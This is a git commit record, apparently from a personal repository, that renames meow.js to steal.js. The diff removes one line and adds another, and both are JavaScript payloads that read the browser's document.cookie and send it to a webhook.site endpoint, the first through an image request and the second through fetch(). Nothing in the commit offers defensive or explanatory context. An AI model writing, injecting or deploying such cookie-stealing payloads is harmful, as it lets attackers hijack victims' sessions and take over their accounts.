d92b116631838069bdba1b7d8526d6cb33843405
dailybee13 <dailybee13@protonmail.com>
2025-04-20 17:34:00 +0530

    Update and rename meow.js to steal.js

--- meow.js
+++
@@ -1,1 +0,0 @@
-x = new Image(); x.src = 'https://webhook.site/925ffae1-fe20-4e4f-ba37-4016c8fe7727?data='+btoa(document.cookie);
---
+++ steal.js
@@ -0,0 +1,1 @@
+fetch("https://webhook.site/925ffae1-fe20-4e4f-ba37-4016c8fe7727/log?cookie=" + encodeURIComponent(document.cookie));
